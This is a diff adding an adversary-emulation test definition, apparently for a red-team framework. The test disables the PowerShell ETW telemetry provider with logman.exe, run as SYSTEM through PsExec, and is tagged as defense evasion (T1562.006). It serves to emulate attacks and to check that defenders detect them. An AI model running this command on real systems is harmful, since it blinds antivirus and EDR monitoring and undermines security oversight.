@@ -1,0 +1,20 @@
+- description: This test was created to disable the Microsoft Powershell ETW provider
+    by using the built-in Windows tool, logman.exe. This provider is used as a common
+    source of telemetry in AV/EDR solutions.
+  id: 233bd007-622d-94ee-3019-efc6a70d0a83
+  name: Disable Powershell ETW Provider - Windows
+  platforms:
+    windows:
+      psh:
+        cleanup: cmd /c "#{ps_exec_location}" -i -s cmd.exe /c logman update trace
+          "#{session}" -p "#{provider}" -ets
+        command: cmd /c "#{ps_exec_location}" -accepteula -i -s cmd.exe /c logman
+          update trace "#{session}" --p "#{provider}" -ets
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: defense-evasion
+  technique:
+    attack_id: T1562.006
+    name: 'Impair Defenses: Indicator Blocking'
